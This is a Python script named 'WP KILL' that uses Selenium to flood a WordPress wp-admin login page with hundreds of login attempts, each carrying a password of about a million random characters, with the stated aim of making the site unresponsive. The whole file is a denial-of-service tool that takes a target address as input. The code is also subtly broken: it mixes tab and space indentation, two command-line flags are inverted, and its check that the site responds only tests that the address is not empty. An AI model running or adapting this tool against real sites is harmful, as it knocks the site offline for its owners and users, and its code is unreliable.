"""
Generates a random string to use on wp-admin. The site will eventually become
    unresponsive.
Author: Primus27
Version: 2.0
"""

# Import packages
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import string
import random
import argparse
from termcolor import colored as colour
import time
from title_generator import TitleGen
import sys
from datetime import datetime

current_version = 2.0


class FireFoxSession:
    """
    Class for each session created.
    """

    def __init__(self):
        """
        Constructor method
        """
		valid_http = ("http://", "https://")
		if any(x in target for x in valid_http):
		    self.address = target
		else:
		    self.address = f"http://{target}/wp-admin"
        self.username = username
        self.browser = self.create_session()
        self.password_seed = get_rand_str(length)

    def create_session(self):
        """
        Method to create a session
        :return: Browser object containing firefox options
        """
        options = FirefoxOptions()
        if not verbose:
            options.add_argument("--headless")
        browser = webdriver.Firefox(options=options)
        browser.get(self.address)
        return browser

    def submit_username(self, element_id):
        """
        Submit username to WP input field
        :param element_id: HTML username element name
        """
        automate = lambda: self.browser.find_element_by_id(element_id)
        # automate().click()
        automate().clear()
        automate().send_keys(self.username)
        if not no_feedback:
            print(colour(f"[*] Username: {self.username}", "blue"))

    def submit_password(self, element_id, gen):
        """
        Submit password to WP input field
        :param element_id: HTML password element name
		:param gen: Generated values attached to seed
        """
        password = f"{self.password_seed}{gen}"
        automate = lambda: self.browser.find_element_by_id(element_id)
        # automate().click()
        automate().clear()
        automate().send_keys(password)
        if not no_feedback:
            print(colour(f"[*] Password (last 50): {password[-50:]}", "blue"))

    def submit_element(self, element_id, form_str):
        """
        Submit element to WP input field
        :param element_id: HTML element name
        :param form_str: String to input
        """
        automate = lambda: self.browser.find_element_by_id(element_id)
        # automate().click()
        automate().clear()
        automate().send_keys(form_str)
        if not no_feedback:
            print(colour(f"{element_id}: {form_str}", "blue"))

    def submit_form(self, element_id):
        """
        Submit page
        :param element_id: HTML submit button element
        """
        button = self.browser.find_element_by_id(element_id)
        scroll_location = button.location_once_scrolled_into_view
        button.click()

    @staticmethod
    def verify_page_responds(page):
        """
        Check that the page loads
        :param page: Web address to check
        :return: Boolean on whether it is online
        """
        return True if page else False

    def shutdown(self):
        """
        Close session
        """
        self.browser.quit()


def get_rand_str(str_length):
    """
    Generates string of length n (not cryptographically secure)
    :param str_length: Length of string
    :return: Random string
    """
    all_string = list(string.ascii_letters)
    all_string.extend(string.digits)
    return ''.join(random.choice(all_string)
                   for _ in range(str_length))


def yes_no_prompt(message):
    """
    A yes/no prompt to eliminate repeated code
    :param message: Message to be displayed
    :return: A response of either yes or no
    """
    while True:
        response = input(message.lower())
        if response in ["yes", "y"]:
            return True
        elif response in ["no", "n"]:
            return False


def main():
    """
    Main Method
    """
    # Output title card
    title = TitleGen(text="WP KILL", author="Primus27").title
    print(title)

    start_time = datetime.now()
    print(colour(f"[*] Attack started at: {start_time}", "yellow"))

    session_obj = FireFoxSession()
    print(colour(f"[+] Session started "
                 f"on {session_obj.address}:80", "green"))

    unreachable_counter = 0
    for attempt in range(1, total_attempts + 1):
        if session_obj.verify_page_responds(session_obj.address):
            time.sleep(0.2)
            session_obj.submit_username("user_login")
            time.sleep(0.2)
            session_obj.submit_password("user_pass", attempt)
            time.sleep(0.2)
            session_obj.submit_form("wp-submit")
            print(colour(f"[+{attempt}] Attempt completed", "green"))
        else:
            print(colour("[-] Unable to load page - Host offline", "red"))
            unreachable_counter += 1
            if unreachable_counter == 5:
                break
    end_time = datetime.now()
    print(colour(f"[*] Attack finished at {end_time}", "yellow"))
    print(colour(f"[*] Duration: {end_time - start_time}", "yellow"))


if __name__ == '__main__':
    # Define argument parser
    parser = argparse.ArgumentParser()
    # Remove existing action groups
    parser._action_groups.pop()

    # Create a required and optional group
    required = parser.add_argument_group("required arguments")
    optional = parser.add_argument_group("optional arguments")

    # Define arguments
    required.add_argument("-T", "--target", action="store", default="",
                          dest="target",
                          help="IP Address of target system",
                          required=True)
	optional.add_argument("-U", "--username", action="store", default="admin",
                          dest="username",
                          help="Username to submit")
    optional.add_argument("--attempts", action="store", default="500",
                          dest="attempts",
                          help="Total number of requests to send")
    optional.add_argument("--length", action="store", default="1000000",
                          dest="length",
                          help="Length of password overflow string")
    optional.add_argument("-nF", "--noFeedback", action="store_false",
                          dest="no_feedback",
                          help="Disable script feedback")
    optional.add_argument("-V", "--verbose", action="store_false",
                          dest="verbose",
                          help="Disable headless mode")
    optional.add_argument("--version", action="version",
                          version="%(prog)s {v}".format(v=current_version),
                          help="Display program version")
    args = parser.parse_args()

    # Assign Arguments
    target = args.target
    verbose = args.verbose
	username = args.username

    try:
        total_attempts = int(args.attempts)
    except ValueError as e:
        sys.exit("Total attempts is not a number. Closing")

    try:
        length = int(args.length)
    except ValueError as e:
        sys.exit("Password length is not a number. Closing")

    no_feedback = args.no_feedback

    # Run main method
    main()
